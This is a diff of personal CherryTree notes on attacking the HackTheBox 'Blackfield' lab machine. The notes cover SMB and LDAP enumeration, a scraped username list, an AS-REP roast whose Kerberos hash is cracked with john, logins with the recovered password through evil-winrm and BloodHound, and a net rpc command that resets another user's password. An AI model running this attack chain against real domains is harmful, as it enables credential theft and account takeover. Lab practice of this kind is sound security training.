@@ -17,21 +17,17 @@ Windows Proof: </rich_text>
     <rich_text family="monospace">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type proof.txt &amp;&amp; ipconfig /all</rich_text>
     <rich_text>
 </rich_text>
-    <node name="Log Book" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="20" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1697668027">
-      <node name="Nmap" unique_id="102" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697668027" ts_lastsave="1697668217">
+    <node name="Log Book" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="20" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1698812872">
+      <node name="Nmap" unique_id="102" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697668027" ts_lastsave="1698813497">
         <rich_text justification="left"></rich_text>
         <rich_text>
 
 
-ldapsearch -x -b </rich_text>
-        <rich_text foreground="#5ebdab">"dc=BLACKFIELD,dc=local"</rich_text>
-        <rich_text> -H ldap</rich_text>
-        <rich_text foreground="#bf2e5e">://</rich_text>
-        <rich_text>10.10.10.192 </rich_text>
-        <rich_text foreground="#bf2e5e">|</rich_text>
-        <rich_text> </rich_text>
-        <rich_text foreground="#bf2e5e">tee</rich_text>
-        <rich_text> ldapSearch.log </rich_text>
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text> 
+
+</rich_text>
         <codebox char_offset="0" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> kali  nmap -sC -sV -Pn 10.10.10.192 -o ~/Desktop/repos/Writeups/HTB/ActiveDirectory101/Blackfield/nmap/nmap_manual.log
 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-18 18:23 EDT
 Nmap scan report for 10.10.10.192 (10.10.10.192)
@@ -59,6 +55,512 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 68.59 seconds
 </codebox>
+        <codebox char_offset="4" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net rpc password "AUDIT2020" "jack@1234" -U "BLACKFIELD.LOCAL"/"support"%"#00^BlackKnight" -S "10.10.10.192"</codebox>
+      </node>
+      <node name="SMB" unique_id="103" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698780009" ts_lastsave="1698789360">
+        <rich_text>Enum4linux
+we see the following directories are readable from 
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+
+We find the following files that we can read, profiles and forensic
+
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+
+or
+use crackmapexec
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+</rich_text>
+        <codebox char_offset="63" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">                                                                                                                                                                          
+ =================================( Share Enumeration on 10.10.10.192 )=================================
+                                                                                                                                                                            
+do_connect: Connection to 10.10.10.192 failed (Error NT_STATUS_IO_TIMEOUT)                                                                                                  
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        forensic        Disk      Forensic / Audit share.
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        profiles$       Disk      
+        SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+Unable to connect with SMB1 -- no workgroup available
+
+[+] Attempting to map shares on 10.10.10.192                                                                                                                                
+                                                                                                                                                                            
+//10.10.10.192/ADMIN$   Mapping: DENIED Listing: N/A Writing: N/A                                                                                                           
+//10.10.10.192/C$       Mapping: DENIED Listing: N/A Writing: N/A
+//10.10.10.192/forensic Mapping: OK Listing: DENIED Writing: N/A
+
+[E] Can't understand response:                                                                                                                                              
+                                                                                                                                                                            
+NT_STATUS_NO_SUCH_FILE listing \*                                                                                                                                           
+//10.10.10.192/IPC$     Mapping: N/A Listing: N/A Writing: N/A
+//10.10.10.192/NETLOGON Mapping: OK Listing: DENIED Writing: N/A
+//10.10.10.192/profiles$        Mapping: OK Listing: OK Writing: N/A
+//10.10.10.192/SYSVOL   Mapping: OK Listing: DENIED Writing: N/A
+</codebox>
+        <codebox char_offset="137" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbclient //10.10.10.192/profiles -U guest</codebox>
+        <codebox char_offset="162" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> Blackfield  crackmapexec smb 10.10.10.192 --shares -u 'randomanon' -p ''
+SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\randomanon: 
+SMB         10.10.10.192    445    DC01             [+] Enumerated shares
+SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
+SMB         10.10.10.192    445    DC01             -----           -----------     ------
+SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
+SMB         10.10.10.192    445    DC01             C$                              Default share
+SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
+SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
+SMB         10.10.10.192    445    DC01             NETLOGON                        Logon server share 
+SMB         10.10.10.192    445    DC01             profiles$       READ            
+SMB         10.10.10.192    445    DC01             SYSVOL                          Logon server share 
+</codebox>
+        <node name="users" unique_id="104" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698789360" ts_lastsave="1698789427">
+          <rich_text>we get the following users from smblicent profiles:
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <codebox char_offset="53" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">AAlleni
+ABarteski
+ABekesz
+ABenzies
+ABiemiller
+AChampken
+ACheretei
+ACsonaki
+AHigchens
+AJaquemai
+AKlado
+AKoffenburger
+AKollolli
+AKruppe
+AKubale
+ALamerz
+AMaceldon
+AMasalunga
+ANavay
+ANesterova
+ANeusse
+AOkleshen
+APustulka
+ARotella
+ASanwardeker
+AShadaia
+ASischo
+ASpruce
+ATakach
+ATaueg
+ATwardowski
+audit2020
+AWangenheim
+AWorsey
+AZigmunt
+BBakajza
+BBeloucif
+BCarmitcheal
+BConsultant
+BErdossy
+BGeminski
+BLostal
+BMannise
+BNovrotsky
+BRigiero
+BSamkoses
+BZandonella
+CAcherman
+CAkbari
+CAldhowaihi
+CArgyropolous
+CDufrasne
+CGronk
+Chiucarello
+Chiuccariello
+CHoytal
+CKijauskas
+CKolbo
+CMakutenas
+CMorcillo
+CSchandall
+CSelters
+CTolmie
+DCecere
+DChintalapalli
+DCwilich
+DGarbatiuc
+DKemesies
+DMatuka
+DMedeme
+DMeherek
+DMetych
+DPaskalev
+DPriporov
+DRusanovskaya
+DVellela
+DVogleson
+DZwinak
+EBoley
+EEulau
+EFeatherling
+EFrixione
+EJenorik
+EKmilanovic
+ElKatkowsky
+EmaCaratenuto
+EPalislamovic
+EPryar
+ESachhitello
+ESariotti
+ETurgano
+EWojtila
+FAlirezai
+FBaldwind
+FBroj
+FDeblaquire
+FDegeorgio
+FianLaginja
+FLasokowski
+FPflum
+FReffey
+GaBelithe
+Gareld
+GBatowski
+GForshalger
+GGomane
+GHisek
+GMaroufkhani
+GMerewether
+GQuinniey
+GRoswurm
+GWiegard
+HBlaziewske
+HColantino
+HConforto
+HCunnally
+HGougen
+HKostova
+IChristijr
+IKoledo
+IKotecky
+ISantosi
+JAngvall
+JBehmoiras
+JDanten
+JDjouka
+JKondziola
+JLeytushsenior
+JLuthner
+JMoorehendrickson
+JPistachio
+JScima
+JSebaali
+JShoenherr
+JShuselvt
+KAmavisca
+KAtolikian
+KBrokinn
+KCockeril
+KColtart
+KCyster
+KDorney
+KKoesno
+KLangfur
+KMahalik
+KMasloch
+KMibach
+KParvankova
+KPregnolato
+KRasmor
+KShievitz
+KSojdelius
+KTambourgi
+KVlahopoulos
+KZyballa
+LBajewsky
+LBaligand
+LBarhamand
+LBirer
+LBobelis
+LChippel
+LChoffin
+LCominelli
+LDruge
+LEzepek
+LHyungkim
+LKarabag
+LKirousis
+LKnade
+LKrioua
+LLefebvre
+LLoeradeavilez
+LMichoud
+LTindall
+LYturbe
+MArcynski
+MAthilakshmi
+MAttravanam
+MBrambini
+MHatziantoniou
+MHoerauf
+MKermarrec
+MKillberg
+MLapesh
+MMakhsous
+MMerezio
+MNaciri
+MShanmugarajah
+MSichkar
+MTemko
+MTipirneni
+MTonuri
+MVanarsdel
+NBellibas
+NDikoka
+NGenevro
+NGoddanti
+NMrdirk
+NPulido
+NRonges
+NSchepkie
+NVanpraet
+OBelghazi
+OBushey
+OHardybala
+OLunas
+ORbabka
+PBourrat
+PBozzelle
+PBranti
+PCapperella
+PCurtz
+PDoreste
+PGegnas
+PMasulla
+PMendlinger
+PParakat
+PProvencer
+PTesik
+PVinkovich
+PVirding
+PWeinkaus
+RBaliukonis
+RBochare
+RKrnjaic
+RNemnich
+RPoretsky
+RStuehringer
+RSzewczuga
+RVallandas
+RWeatherl
+RWissor
+SAbdulagatov
+SAjowi
+SAlguwaihes
+SBonaparte
+SBouzane
+SChatin
+SDellabitta
+SDhodapkar
+SEulert
+SFadrigalan
+SGolds
+SGrifasi
+SGtlinas
+SHauht
+SHederian
+SHelregel
+SKrulig
+SLewrie
+SMaskil
+Smocker
+SMoyta
+SRaustiala
+SReppond
+SSicliano
+SSilex
+SSolsbak
+STousignaut
+support
+svc_backup
+SWhyte
+SWynigear
+TAwaysheh
+TBadenbach
+TCaffo
+TCassalom
+TEiselt
+TFerencdo
+TGaleazza
+TKauten
+TKnupke
+TLintlop
+TMusselli
+TOust
+TSlupka
+TStausland
+TZumpella
+UCrofskey
+UMarylebone
+UPyrke
+VBublavy
+VButziger
+VFuscca
+VLitschauer
+VMamchuk
+VMarija
+VOlaosun
+VPapalouca
+WSaldat
+WVerzhbytska
+WZelazny
+XBemelen
+XDadant
+XDebes
+XKonegni
+XRykiel
+YBleasdale
+YHuftalin
+YKivlen
+YKozlicki
+YNyirenda
+YPredestin
+YSeturino
+YSkoropada
+YVonebers
+YZarpentine
+ZAlatti
+ZKrenselewski
+ZMalaab
+ZMiick
+ZScozzari
+ZTimofeeff
+ZWausik
+
+</codebox>
+        </node>
+      </node>
+      <node name="ASRepRoasting" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698789563" ts_lastsave="1698812785">
+        <rich_text>
+
+we get the following
+
+
+
+so we crack it via john 
+
+
+
+
+
+we get the following password
+
+
+
+running evil-winrm for support@BLACKFIELD.LOCAL
+
+
+
+and we also see the valid users
+
+
+
+we check the relationship of support with the other too by bloodhound graph
+
+
+
+
+
+
+
+</rich_text>
+        <codebox char_offset="0" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetNPUsers BLACKFIELD.local/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast --dc-ip = 10.10.10.192</codebox>
+        <codebox char_offset="25" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cat hashes.asreproast
+$krb5asrep$23$support@BLACKFIELD.LOCAL:ded5eb117e247aa8f9124b08455a4000$c1926ce42d8a6b13373fc0d22d936a2d8024316d8767a144d92200dab52e928b2e8cfbb8bfc7981a9e269880daeeec8a0662437ed33816be097a721d185ba02df1eb844276aa74f41a9e7fb8840756401461be95eefd5cf448d18faa4cbbfa3025d6cd0618a4d0d989e1b37c911080b27cb851076921749299f665ec510f54fdbe1cf179ea5abe84a9a2b9755a4b06a24c4360812cf16a9675f78a9505fd2a770e61dc11375a6a0cb18d715747cf163a45e88d666759c993614f92d15efd62b3eebe4971767b12f51f3326db726cdd14b5468418c07f47710e257e91d6c01f2d43bd5571262e128a8fea83e08abb37521009abc</codebox>
+        <codebox char_offset="55" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Will run 5 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)     
+1g 0:00:00:10 DONE (2023-10-31 21:31) 0.09469g/s 1357Kp/s 1357Kc/s 1357KC/s #13Carlyn.."chito"
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</codebox>
+        <codebox char_offset="90" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">#00^BlackKnight</codebox>
+        <codebox char_offset="142" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.10.192 -u support -p '#00^BlackKnight' -s .</codebox>
+        <codebox char_offset="177" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">audit2020
+svc_backup
+support</codebox>
+        <codebox char_offset="258" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> bloodhound-python -ns 10.10.10.192 -d BLACKFIELD.local -u support -p '#00^BlackKnight' -c all  </codebox>
+      </node>
+      <node name="SMB Returns" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698802844" ts_lastsave="1698812321">
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+using credentials with bloodhound python
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+
+
+we see that we can change the 
+
+
+</rich_text>
+        <codebox char_offset="0" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.10.10.192 -u support -p '#00^BlackKnight'
+
+[+] IP: 10.10.10.192:445        Name: 10.10.10.192              Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        forensic                                                NO ACCESS       Forensic / Audit share.
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        profiles$                                               READ ONLY
+        SYSVOL                                                  READ ONLY       Logon server share </codebox>
+        <codebox char_offset="2" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbclient //10.10.10.192/profiles$ -U support</codebox>
+        <codebox char_offset="47" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> bloodhound-python --dns-tcp -ns 10.10.10.192 -d BLACKFIELD.local -u 'support' -p '#00^BlackKnight' -c all</codebox>
+        <codebox char_offset="83" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
+      </node>
+      <node name="privesc" unique_id="107" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698812872" ts_lastsave="1698813559">
+        <rich_text>from the bloodhound we see that
+
+support user can change password for audit2020 user
+
+
+
+
+let do that to get access to it:
+
+from the help page we can change it via
+
+
+
+
+the rest was too complicated so i used this writuep
+</rich_text>
+        <rich_text link="webs https://fahmifj.github.io/hackthebox/blackfield/">https://fahmifj.github.io/hackthebox/blackfield/</rich_text>
+        <rich_text>
+
+</rich_text>
+        <encoded_png char_offset="86" justification="left" link="">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